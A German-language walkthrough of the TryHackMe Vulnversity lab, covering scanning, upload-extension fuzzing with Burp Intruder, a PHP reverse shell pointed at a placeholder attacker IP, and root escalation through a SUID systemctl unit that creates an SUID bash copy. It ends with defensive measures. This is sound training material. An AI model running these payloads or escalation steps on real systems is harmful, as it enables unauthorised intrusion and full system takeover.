# TryHackMe – Vulnversity Walkthrough

> **Umgebung:** Ausschließlich die autorisierte TryHackMe-Labmaschine. IP-Adressen und Ports sind Platzhalter und müssen an die eigene Session angepasst werden.
>
> **Ziel:** Enumeration, Web-Upload-Analyse, Initial Access und Privilege Escalation nachvollziehen und dokumentieren.

## 1. Überblick

| Phase | Werkzeug | Zweck |
|---|---|---|
| Reconnaissance | Nmap | Offene Ports und Dienste finden |
| Web Enumeration | Gobuster | Verzeichnisse und Upload-Endpunkt entdecken |
| Request Analysis | Burp Suite | HTTP-Upload untersuchen und Dateiendungen testen |
| Initial Access | Netcat + PHP | Reverse Shell in der THM-Umgebung erhalten |
| Privilege Escalation | `find`, `systemctl` | SUID-Fehlkonfiguration erkennen und ausnutzen |
| Proof | `id`, `cat` | Rechte und Lab-Flags überprüfen |

**Variablen:**

- `TARGET_IP`: IP der gestarteten Vulnversity-Maschine.
- `WEB_PORT`: HTTP-Port aus dem Scan (im Room üblicherweise `3333`).
- `KALI_IP`: über das THM-VPN erreichbare Adresse der eigenen Kali-Maschine, meist auf `tun0`.
- `LPORT`: eigener Listener-Port, hier `1234`.

## 2. Reconnaissance mit Nmap

```bash
nmap -sV -sC -p- TARGET_IP
```

**Erklärung:** `-p-` scannt alle TCP-Ports; `-sV` versucht Dienstversionen zu ermitteln; `-sC` führt Standard-NSE-Skripte aus. Je nach Netzwerk und Rechten können Scan-Optionen und Laufzeit variieren.

Ergebnisse dokumentieren: Welche Ports sind offen? Welcher Port hostet die Webseite? Welche Dienste und Versionen wurden erkannt?

## 3. Web Enumeration mit Gobuster

```bash
gobuster dir -u http://TARGET_IP:3333/ -w /usr/share/wordlists/dirb/common.txt
```

`dir` sucht Pfade auf einem Webserver, `-u` legt das Ziel fest, `-w` die Wörterliste. Im Room ist `/internal/` besonders relevant.

Öffnen:

```text
http://TARGET_IP:3333/internal/
```

Dort befindet sich das Upload-Formular.

## 4. Burp Suite – Upload untersuchen

### 4.1 Proxy einrichten

1. Burp Suite starten: `burpsuite`.
2. **Proxy → Open Browser** öffnen. Dieser Browser ist bereits für Burp konfiguriert.
3. `/internal/` aufrufen.
4. Für normales Browsen **Intercept off** verwenden.
5. Vor dem Absenden einer Testdatei **Intercept on** aktivieren.
6. Eine Testdatei auswählen und auf **Submit** klicken.

Eine Upload-Anfrage verwendet gewöhnlich `POST` mit `multipart/form-data`:

```http
POST /internal/index.php HTTP/1.1
Host: TARGET_IP:3333
Content-Type: multipart/form-data; boundary=----example

------example
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream

Test
------example--
```

Das Beispiel ist schematisch; der tatsächliche Boundary-Wert und weitere Header werden vom Browser erzeugt.

### 4.2 Intruder – Dateiendungen testen

1. Rechtsklick auf die abgefangene Anfrage → **Send to Intruder**.
2. Angriffstyp **Sniper** wählen.
3. Im `filename`-Parameter ausschließlich die Dateiendung als Payload-Position markieren.
4. Unter **Payloads** eine einfache Liste hinterlegen.
5. Angriff starten und **Response** jeder Anfrage vergleichen.

**Variante A – Punkt ist außerhalb der Payload:**

```http
filename="test.§php§"
```

Payloads:

```text
php
php3
php4
php5
phtml
```

**Variante B – Punkt gehört zur Payload:**

```http
filename="test§.php§"
```

Payloads:

```text
.php
.php3
.php4
.php5
.phtml
```

**Wichtig:** Burp kann den Punkt als `%2e` URL-kodieren. Dann wird aus `test.phtml` unter Umständen `test%2ephtml`, was der Server nicht wie erwartet behandelt. Unter **Payload encoding** die URL-Kodierung für diese Payload deaktivieren beziehungsweise die Kodierungseinstellungen prüfen. Immer den tatsächlich gesendeten **Request** kontrollieren.

### 4.3 Ergebnisse richtig interpretieren

Ein HTTP-Status `200 OK` bedeutet nur, dass die HTTP-Anfrage beantwortet wurde – nicht, dass der Upload akzeptiert wurde. Deshalb den Response-Body auf Meldungen wie `Extension not allowed` oder `Success` prüfen.

**Ergebnis in Vulnversity:** Die Endung `.phtml` wird akzeptiert. Eine Dateiendungs-Blacklist ist kein ausreichender Schutz gegen serverseitig ausführbare Uploads.

## 5. Initial Access – Reverse Shell

> Nur auf der eigenen THM-Zielmaschine ausführen.

### 5.1 Eigene VPN-IP bestimmen

```bash
ip -4 addr show tun0
```

In einer PHP-Reverse-Shell-Konfiguration steht die **eigene Kali-IP**, nicht die Ziel-IP:

```php
$ip = 'KALI_IP';
$port = 1234;
```

Die Zielmaschine verbindet sich zurück zum Listener auf Kali.

### 5.2 Listener starten

```bash
nc -lvnp 1234
```

`-l` lauscht, `-v` zeigt zusätzliche Informationen, `-n` vermeidet Namensauflösung, `-p` legt den Port fest.

### 5.3 Datei hochladen und aufrufen

Die vorbereitete PHP-Datei als `shell.phtml` speichern und über das Formular unter `/internal/` hochladen. Sobald `Success` erscheint, kann der Dateipfad überprüft werden:

```text
http://TARGET_IP:3333/internal/uploads/shell.phtml
```

Der tatsächliche Dateiname muss exakt stimmen. Wenn die Datei serverseitig ausgeführt wird und die Verbindung möglich ist, erscheint die Shell im Netcat-Terminal.

### 5.4 Shell prüfen

```bash
whoami
id
```

Typisches Ergebnis:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Die Meldung `/bin/sh: 0: can't access tty; job control turned off` ist bei einer einfachen Reverse Shell häufig und bedeutet lediglich, dass kein vollwertiges interaktives TTY vorhanden ist.

## 6. Privilege Escalation – SUID Enumeration

```bash
find / -type f -perm -4000 2>/dev/null
```

| Ausdruck | Bedeutung |
|---|---|
| `find /` | Gesamtes Dateisystem durchsuchen |
| `-type f` | Reguläre Dateien |
| `-perm -4000` | SUID-Bit gesetzt |
| `2>/dev/null` | Fehlermeldungen unterdrücken |

Im Room ist `systemctl` mit einer ungewöhnlichen SUID-Konfiguration relevant. Prüfen:

```bash
ls -l /bin/systemctl
```

Ein `s` an der Eigentümer-Ausführungsposition (beispielsweise `-rwsr-xr-x`) kennzeichnet das SUID-Bit. Ein SUID-Bit allein garantiert auf modernen Systemen allerdings nicht, dass ein bestimmter Exploit funktioniert.

Referenz: https://gtfobins.github.io/gtfobins/systemctl/

## 7. Systemd-Service und Root-Rechte

### 7.1 Warum funktioniert der Ansatz?

Eine fehlkonfigurierte privilegierte `systemctl`-Ausführung kann ermöglichen, eine selbst erstellte systemd-Unit als Root zu starten. Eine Unit definiert unter anderem, welcher Befehl mit `ExecStart=` ausgeführt wird.

**Beispiel für die Service-Datei:**

```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"

[Install]
WantedBy=multi-user.target
```

- `Type=oneshot`: Einmaligen Befehl ausführen.
- `ExecStart`: Erstellt eine Kopie von Bash und setzt das SUID-Bit auf der Kopie.
- `WantedBy=multi-user.target`: Installationszuordnung für `systemctl enable`.

### 7.2 Datei in der Shell erstellen

Um Probleme mit mehrzeiligen Anführungszeichen zu vermeiden:

```bash
printf '%s\n' \
'[Service]' \
'Type=oneshot' \
'ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"' \
'[Install]' \
'WantedBy=multi-user.target' > /tmp/test.service
```

Danach prüfen:

```bash
cat /tmp/test.service
ls -l /tmp/test.service
```

### 7.3 Unit verlinken und starten

```bash
systemctl link /tmp/test.service
systemctl enable --now test.service
```

Bei Fehlern:

```bash
systemctl status test.service --no-pager
journalctl -u test.service -n 20 --no-pager
```

Ein `oneshot`-Service kann nach erfolgreichem Ablauf als `inactive (dead)` erscheinen. Der Exit-Status und die Protokolle sind aussagekräftiger.

### 7.4 SUID-Bash starten

```bash
ls -l /tmp/rootbash
/tmp/rootbash -p
id
```

Erwartet bei Erfolg:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

`euid=0(root)` zeigt effektive Root-Rechte an. Die ursprüngliche UID bleibt dabei `www-data`. Das `-p` bewahrt die erhöhte effektive Benutzer-ID.

## 8. Flags überprüfen

User-Flag:

```bash
cat /home/bill/user.txt
```

Root-Flag:

```bash
cat /root/root.txt
```

**Achtung:** Nur eine Shell mit effektiven Root-Rechten kann die Root-Flag normalerweise lesen. Nach einem Shell-Wechsel oder einer neuen Reverse-Shell-Verbindung die Rechte erneut mit `id` kontrollieren.

Falls nötig, die Root-Bash und den Lesevorgang im selben Prozess ausführen:

```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
```

Die tatsächlichen Flag-Werte gehören nicht in ein öffentliches Repository.

## 9. Troubleshooting – aufgetretene Probleme

| Problem | Ursache | Lösung |
|---|---|---|
| Burp-Browser lädt endlos | `Intercept on` hält eine GET-Anfrage an | **Forward** klicken oder **Intercept off** |
| Intruder zeigt überall HTTP 200 | Statuscode ist nicht gleich Upload-Erfolg | Response-Body auf `Success`/Fehlertext prüfen |
| Alle Endungen abgelehnt | Payload falsch markiert oder Punkt als `%2e` kodiert | Tatsächlichen Request prüfen, Payload-Encoding anpassen |
| `404 Not Found` nach Upload | Falscher Pfad oder Dateiname | Upload-Erfolg und `/internal/uploads/DATEI` kontrollieren |
| `/path/to/...` existiert nicht | Platzhalter aus GTFOBins unverändert übernommen | Tatsächlichen absoluten Pfad verwenden |
| Shell zeigt `>` statt `$` | Offenes Anführungszeichen / unvollständiger Befehl | Mit `Ctrl+C` abbrechen; `printf` verwenden |
| `test.servic` statt `test.service` | Tippfehler im Dateinamen | `mv test.servic test.service` |
| `/tmp/rootbash` fehlt | Service wurde nicht ausgeführt oder schlug fehl | Unit-Datei, Status und Journal prüfen |
| `/root` → Permission denied | Aktuelle Shell hat möglicherweise kein `euid=0` | `id` prüfen und privilegierten Prozess erneut starten |
| `can't access tty` | Reverse Shell hat kein echtes TTY | Nicht mit fehlenden Root-Rechten verwechseln |

## 10. Sicherheitsmaßnahmen (Defender-Perspektive)

1. Datei-Uploads über eine strikte Allowlist, MIME-/Inhaltsprüfung und zufällige Dateinamen absichern.
2. Hochgeladene Dateien außerhalb ausführbarer Webverzeichnisse speichern; serverseitige Skriptausführung dort deaktivieren.
3. Webserver mit minimalen Rechten betreiben.
4. SUID-Dateien regelmäßig auditieren und unnötige SUID-Bits entfernen.
5. `systemctl` nicht als frei nutzbares privilegiertes Werkzeug für unprivilegierte Benutzer verfügbar machen.
6. systemd-Unit-Verzeichnisse und Berechtigungen schützen.
7. Monitoring für ungewöhnliche Uploads, neue Units und verdächtige ausgehende Verbindungen einrichten.

## 11. Quellen

- TryHackMe – Vulnversity: https://tryhackme.com/room/vulnversity
- PortSwigger – Burp Suite Documentation: https://portswigger.net/burp/documentation
- GTFOBins – systemctl: https://gtfobins.github.io/gtfobins/systemctl/
- Nmap Reference Guide: https://nmap.org/book/man.html
- systemd.service Manual: https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html

---

**Lernfazit:** Die Angriffskette kombiniert unzureichend abgesicherte Web-Uploads mit einer lokalen Fehlkonfiguration. Entscheidend ist, bei jedem Schritt den tatsächlichen Request, die Serverantwort, die Dateipfade und die effektiven Benutzerrechte zu überprüfen, statt sich nur auf einen HTTP-Statuscode oder einen Shell-Prompt zu verlassen.

